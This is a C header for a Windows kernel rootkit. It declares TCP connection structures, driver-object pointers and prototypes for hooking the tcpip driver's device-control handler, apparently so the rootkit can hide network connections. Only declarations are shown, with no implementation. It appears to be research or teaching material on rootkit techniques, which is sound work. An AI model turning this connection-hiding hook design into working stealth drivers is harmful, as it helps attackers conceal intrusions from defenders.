///////////////////////////////////////////////////////////////////////////////////////
// Filename Rootkit.h
// 
// Author: Jamie Butler
// Email:  james.butler@hbgary.com or butlerjr@acm.org
//
// Description: Defines globals, function prototypes, etc. used by rootkit.c.
//
// Version: 1.0

typedef BOOLEAN BOOL;
typedef unsigned long DWORD;
typedef DWORD * PDWORD;
typedef unsigned long ULONG;
typedef unsigned short WORD;
typedef unsigned char BYTE;
typedef BYTE * LPBYTE;

#define IOCTL_TCP_QUERY_INFORMATION_EX 0x00120003
//#define MAKEPORT(a, b)   ((WORD)(((UCHAR)(a))|((WORD)((UCHAR)(b))) << 8))
#define HTONS(a)  (((0xFF&a)<<8) + ((0xFF00&a)>>8))

typedef struct _CONNINFO101 {
   unsigned long status; 
   unsigned long src_addr; 
   unsigned short src_port; 
   unsigned short unk1; 
   unsigned long dst_addr; 
   unsigned short dst_port; 
   unsigned short unk2; 
} CONNINFO101, *PCONNINFO101;

typedef struct _CONNINFO102 {
   unsigned long status; 
   unsigned long src_addr; 
   unsigned short src_port; 
   unsigned short unk1; 
   unsigned long dst_addr; 
   unsigned short dst_port; 
   unsigned short unk2; 
   unsigned long pid;
} CONNINFO102, *PCONNINFO102;

typedef struct _CONNINFO110 {
   unsigned long size;
   unsigned long status; 
   unsigned long src_addr; 
   unsigned short src_port; 
   unsigned short unk1; 
   unsigned long dst_addr; 
   unsigned short dst_port; 
   unsigned short unk2; 
   unsigned long pid;
   PVOID    unk3[35];
} CONNINFO110, *PCONNINFO110;

typedef struct _REQINFO {
	PIO_COMPLETION_ROUTINE OldCompletion;
	unsigned long          ReqType;
} REQINFO, *PREQINFO;

PFILE_OBJECT pFile_tcp;
PDEVICE_OBJECT pDev_tcp;
PDRIVER_OBJECT pDrv_tcpip;

typedef NTSTATUS (*OLDIRPMJDEVICECONTROL)(IN PDEVICE_OBJECT, IN PIRP);
OLDIRPMJDEVICECONTROL OldIrpMjDeviceControl;

NTSTATUS RootkitUnload(IN PDRIVER_OBJECT);
NTSTATUS InstallTCPDriverHook();
NTSTATUS HookedDeviceControl(IN PDEVICE_OBJECT, IN PIRP);

NTSTATUS IoCompletionRoutine(IN PDEVICE_OBJECT, IN PIRP, IN PVOID);
